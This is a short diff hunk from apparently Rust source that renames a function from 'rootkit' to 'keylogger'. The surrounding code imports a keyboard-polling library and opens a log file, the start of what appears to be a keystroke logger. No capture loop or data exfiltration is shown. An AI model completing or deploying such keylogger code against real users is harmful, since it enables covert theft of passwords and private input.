@@ -2,7 +2,7 @@ use device_query::{DeviceQuery, DeviceState, Keycode};
 use std::fs::OpenOptions;
 use std::io::Write;
 
-pub fn rootkit() {
+pub fn keylogger() {
     // Open or create the log file
     let mut file = OpenOptions::new()
         .create(true)
